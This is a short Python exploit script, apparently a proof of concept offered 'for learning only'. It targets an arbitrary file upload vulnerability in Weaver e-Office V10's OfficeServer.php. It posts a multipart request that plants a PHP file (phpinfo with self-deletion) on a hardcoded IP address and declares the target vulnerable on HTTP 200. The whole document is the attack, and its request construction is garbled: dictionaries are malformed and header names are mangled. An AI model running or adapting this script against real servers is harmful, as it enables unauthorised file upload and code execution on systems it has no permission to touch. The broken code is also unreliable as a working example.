import re
import requests
banner='''
-----------------------------
    _              _             
   / \   _ __ ___ (_) ___ __ _   
  / _ \ | '_ ` _ \| |/ __/ _` |  
 / ___ \| | | | | | | (_| (_| |_ 
/_/   \_\_| |_| |_|_|\___\__,_(_)
    +                          此脚本仅用于学习                          +
Author  :   Amica安全攻防
-----------------------------
''' 
url='http://81.68.222.196:8888/eoffice10/server/public/iWebOffice2015/OfficeServer.php'
headers = {
    'User - Agent':'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Content - Length':'393',
    'Content - Type': 'multipart / form - data;',
    'boundary = ----WebKitFormBoundaryJjb5ZAJOOXO7fwjs'
    'Accept - Encoding': 'gzip, deflate',
    'Connection':'close'
}
 
data = {
    "------WebKitFormBoundaryJjb5ZAJOOXO7fwjs"
    'Content-Disposition': 'form-data; name="FileData"; filename="1.jpg"',
    'Content-Type': 'image/jpeg'
                    
    '<?php phpinfo();unlink(__FILE__);?>'
    "------WebKitFormBoundaryJjb5ZAJOOXO7fwjs",
    'Content-Disposition': 'form-data; name="FormData"'
 
    "{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test12.php'}"
    "------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--"
}
 
response = requests.post(url, headers=headers, data=data)
 
print('Status Code:', response.status_code)
 
if response.status_code == 200:
    print("存在泛微OA E-Office V10 OfficeServer 任意文件上传漏洞！！")